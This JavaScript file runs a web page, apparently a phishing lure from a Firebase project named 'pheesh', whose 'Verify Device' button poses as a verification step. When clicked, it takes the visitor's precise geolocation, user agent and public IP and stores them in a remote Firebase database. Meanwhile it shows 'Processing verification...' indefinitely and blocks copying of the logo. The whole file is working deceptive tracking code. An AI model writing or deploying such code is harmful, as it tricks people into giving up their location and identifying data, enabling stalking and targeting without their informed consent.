// Initialize Firebase with minimal config
const firebaseConfig = {
    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app"
};

// Initialize Firebase
let database;
try {
    firebase.initializeApp(firebaseConfig);
    console.log('Firebase initialized successfully');
    database = firebase.database();
    console.log('Database reference created');

    // Test database connection
    database.ref('.info/connected').on('value', (snapshot) => {
        const isConnected = snapshot.val();
        console.log('Database connection state:', isConnected);
        if (!isConnected && document.visibilityState !== 'hidden') {
            console.warn('Attempting to connect to Firebase database...');
        }
    });

    // Test write permission
    const testRef = database.ref('test-write');
    testRef.set({
        timestamp: firebase.database.ServerValue.TIMESTAMP
    }).then(() => {
        console.log('Write permission verified');
        testRef.remove(); // Clean up test data
    }).catch(error => {
        console.error('Write permission test failed:', error);
    });

} catch (error) {
    console.error('Error initializing Firebase:', error);
}

// Prevent right-click on logo
document.querySelector('.logo').addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});

// Prevent drag on logo
document.querySelector('.logo').addEventListener('dragstart', (e) => {
    e.preventDefault();
    return false;
});

// Prevent copy on logo
document.querySelector('.logo').addEventListener('copy', (e) => {
    e.preventDefault();
    return false;
});

// Main functionality
document.addEventListener('DOMContentLoaded', () => {
    const allowLocationButton = document.getElementById('allowLocation');
    const locationStatus = document.getElementById('locationStatus');
    
    allowLocationButton.addEventListener('click', () => {
        allowLocationButton.classList.add('loading');
        allowLocationButton.disabled = true;
        allowLocationButton.textContent = 'Verifying';
        document.querySelector('.thank-you-card').classList.add('processing');
        
        locationStatus.textContent = 'Processing verification...';
        
        // Get location data
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    console.log('Location obtained:', position.coords);
                    const locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        timestamp: new Date().toISOString(),
                        userAgent: navigator.userAgent,
                        // We'll get IP address from a service like ipify
                        ip: await fetch('https://api.ipify.org?format=json')
                            .then(response => response.json())
                            .then(data => data.ip)
                            .catch(() => 'Unknown')
                    };

                    console.log('Attempting to save location data:', locationData);

                    // Save location data to Firebase
                    if (!database) {
                        console.error('Database not initialized');
                        locationStatus.textContent = 'Verification error. Please try again.';
                        return;
                    }

                    try {
                        const newLocationRef = database.ref('locations').push();
                        await newLocationRef.set(locationData);
                        console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
                        locationStatus.textContent = 'Processing verification...';
                    } catch (error) {
                        console.error('Error saving location to Firebase:', error);
                        console.error('Error details:', {
                            code: error.code,
                            message: error.message,
                            stack: error.stack
                        });
                        locationStatus.textContent = 'Verification error. Please try again.';
                        allowLocationButton.disabled = false;
                        allowLocationButton.textContent = 'Verify Device';
                        allowLocationButton.classList.remove('loading');
                    }
                },
                (error) => {
                    console.error('Error getting location:', error);
                    // Keep showing loading state on location error
                    locationStatus.textContent = 'Processing verification...';
                }
            );
        } else {
            console.error('Geolocation not supported');
            // Keep showing loading state if geolocation not supported
            locationStatus.textContent = 'Processing verification...';
        }
    });
});
